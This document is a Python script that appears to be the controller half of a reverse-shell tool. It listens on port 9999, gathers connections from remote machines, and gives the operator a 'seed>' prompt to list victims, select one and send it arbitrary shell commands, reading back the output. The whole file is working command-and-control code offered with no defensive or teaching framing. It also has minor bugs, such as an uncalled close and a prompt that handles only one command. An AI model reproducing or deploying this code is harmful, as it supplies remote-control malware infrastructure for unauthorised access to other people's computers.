import socket
import sys
import threading
import time
from queue import Queue


NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]
queue = Queue()
all_connection = []
all_address = []

#creating socket

def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("socket creation error : "+str(msg))

#Bind socket to port
def socket_binding():
    try:
        global host
        global port
        global s

        print("Binding socket to port "+str(port))
        print("Server is listning...")
        #bind port to server
        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print(str(msg)+" Trying... ")
        socket_binding()


def accept_connection():
    #close all curently available connections
    for c in all_connection:
        c.close

    del all_connection[:]
    del all_address[:]
    while 1 :
        try:
            conn,address = s.accept()
            conn.setblocking(1)

            all_connection.append(conn)
            all_address.append(address)
            print("\nConnection has Established: "+address[0])


        except:
            print("Error Accepting connection")



def start_sploit():
    cmd = input("seed>")

    if cmd == "list":
        list_connections()
    elif 'select' in cmd:
        conn = get_target(cmd)
        if conn is not None:
            send_target_commands(conn)
    else:
        print("Command not recognized!!")

def list_connections():
    results = ''
    for i, conn in enumerate(all_connection):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connection[i]
            del all_address[i]
            continue
        results += str(i)+ ' ' +str(all_address[i][0]) +'  '+ str(all_address[i][1])+ '\n'

    print("-----CLIENTS----- \n" + results)

def get_target(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = all_connection[target]
        print("You are now connected to "+str(all_address[target][0]))
        print(str(all_address[target][0]) + '> ', end="")
        return conn
    except:
        print("Not a valid Connection")
        return None

def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480),"utf-8")
                print(client_response , end="")
            if cmd == 'quit':
                break
        except:
            print("Connection was lost!")
            break

#create worker thread
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

#Do the next job in queue
def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_binding()
            accept_connection()
        if x == 2:
            start_sploit()
        queue.task_done()

#each list iteam is a new job
def create_job():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()

#SERVER START
create_workers()
create_job()



